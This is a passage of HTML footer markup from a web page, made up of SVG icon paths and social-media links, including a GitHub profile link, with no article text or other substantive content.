20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
